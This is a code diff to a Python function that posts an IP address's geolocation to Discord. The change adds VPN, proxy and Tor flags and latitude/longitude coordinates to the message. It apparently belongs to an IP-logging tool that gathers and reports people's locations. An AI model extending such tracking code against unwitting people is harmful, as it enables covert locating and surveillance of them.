@@ -40,9 +40,18 @@ def send_ip_to_discord(ip, data):
                               description=f"IP: `{ip}`",
                               colour=0x00ff00)
         embed.add_field(name="Location", 
-                        value=f"{data['location']['city']}, {data['location']['region']}, Country: {data['location']['country']} {data['flag']['emoji']}", 
+                        value=f"{data['location']['city']}, {data['location']['region']}, {data['location']['country']} {data['flag']['emoji']}", 
                         inline=False)
-        
+        embed.add_field(name="Security Info",
+                        value=f"Is VPN: {data['security']['is_vpn']}\n"
+                              f"Is Proxy: {data['security']['is_proxy']}\n"
+                              f"Is Tor: {data['security']['is_tor']}\n"
+                              f"Is Mobile: {data['security']['is_mobile']}",
+                        inline=False)
+        embed.add_field(name="Coordinates",
+                        value=f"Latitude: {data['location']['latitude']}\n"
+                              f"Longitude: {data['location']['longitude']}",
+                        inline=False)
         # Use the bot's API to send the message
         asyncio.run_coroutine_threadsafe(
             # Format the message with the IP and location data
